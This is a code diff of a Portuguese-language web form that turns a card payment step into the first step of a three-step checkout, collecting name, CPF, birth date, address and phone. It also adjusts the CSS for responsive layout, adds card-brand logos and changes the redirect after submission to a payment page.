@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Formulário de Pagamento</title>
+    <title>Formulário de Dados Pessoais</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -42,70 +42,94 @@
             margin-bottom: 5px;
         }
         .form-group input {
-            width: calc(100% - 20px);
+            width: 100%;
             padding: 10px;
-            font-size: 16px;
+            font-size: 1rem;
             border: 1px solid #ccc;
             border-radius: 5px;
+            box-sizing: border-box;
         }
         .form-group input[type="submit"] {
             background: #007bff;
             color: white;
             border: none;
             cursor: pointer;
-            width: calc(100% - 20px);
+            width: 100%;
+            text-align: center;
+            display: block;
+            margin: 0 auto;
+            box-sizing: border-box;
         }
         .form-group input[type="submit"]:hover {
             background: #0056b3;
+        }
+        .payment-methods {
+            display: flex;
+            justify-content: center;
+            margin-top: 20px;
+            flex-wrap: wrap;
+        }
+        .payment-methods img {
+            margin: 10px;
+            width: 50px;
+        }
+        @media (max-width: 600px) {
+            .container {
+                padding: 10px;
+            }
+            .form-group input {
+                padding: 8px;
+                font-size: 0.9rem;
+            }
+            .form-group input[type="submit"] {
+                padding: 8px;
+            }
+            .step div {
+                padding: 8px;
+                font-size: 0.9rem;
+            }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <form id="paymentForm">
+        <form id="personalForm">
             <div class="step">
-                <div>1</div>
-                <div class="current">2</div>
+                <div class="current">1</div>
+                <div>2</div>
                 <div>3</div>
             </div>
             <div class="form-group">
-                <label for="cartaoCredito">Número no Cartão</label>
-                <input type="text" id="cartaoCredito" name="cartaoCredito" required maxlength="16" pattern="\d{16}" title="Somente 16 caracteres numéricos">
+                <label for="name">Nome Completo</label>
+                <input type="text" id="name" name="name" required pattern="[A-Za-zÀ-ÿ\s]+" title="Apenas caracteres do alfabeto">
             </div>
             <div class="form-group">
-                <label for="cardName">Nome no Cartão</label>
-                <input type="text" id="cardName" name="cardName" required pattern="[A-Za-z\s]+" title="Somente caracteres alfabéticos">
+                <label for="cpf">CPF</label>
+                <input type="text" id="cpf" name="cpf" required maxlength="11" pattern="\d{11}" title="Apenas 11 números">
             </div>
             <div class="form-group">
-                <label for="expiry">Validade (MM/AA)</label>
-                <input type="text" id="expiry" name="expiry" required maxlength="5" placeholder="MM/AA">
+                <label for="birth">Nascimento</label>
+                <input type="date" id="birth" name="birth" required>
             </div>
             <div class="form-group">
-                <label for="codigo">Código</label>
-                <input type="text" id="codigo" name="codigo" required maxlength="3" pattern="\d{3}" title="Somente 3 caracteres numéricos">
+                <label for="address">Endereço</label>
+                <input type="text" id="address" name="address" required pattern="[A-Za-zÀ-ÿ0-9\s,.-]+" title="Caracteres alfa numéricos">
             </div>
             <div class="form-group">
-                <label for="cpfPayment">CPF</label>
-                <input type="text" id="cpfPayment" name="cpfPayment" required maxlength="11" pattern="\d{11}" title="Somente 11 caracteres numéricos">
+                <label for="phone">Celular</label>
+                <input type="tel" id="phone" name="phone" required maxlength="11" pattern="\d{11}" title="DDD + número, totalizando 11 números">
             </div>
             <div class="form-group">
                 <input type="submit" value="Próximo passo">
             </div>
+            <div class="payment-methods">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="MasterCard">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa">
+            </div>
         </form>
     </div>
     <script>
-        document.getElementById('expiry').addEventListener('input', function(e) {
-            const input = e.target.value.replace(/\D/g, '').substring(0, 4);
-            const month = input.substring(0, 2);
-            const year = input.substring(2, 4);
-            if (input.length >= 3) {
-                e.target.value = `${month}/${year}`;
-            } else if (input.length >= 1) {
-                e.target.value = month;
-            }
-        });
-
-        document.getElementById('paymentForm').addEventListener('submit', function(e) {
+        document.getElementById('personalForm').addEventListener('submit', function(e) {
             e.preventDefault();
             const form = e.target;
             const data = new FormData(form);
@@ -115,7 +139,7 @@
             })
             .then(response => {
                 if (response.ok) {
-                    window.location.href = 'agradecimento.html';
+                    window.location.href = 'pagamento.html';
                 } else {
                     alert('Houve um problema com o envio do formulário. Por favor, tente novamente.');
                 }
@@ -127,4 +151,5 @@
     </script>
 </body>
 </html>
+
 
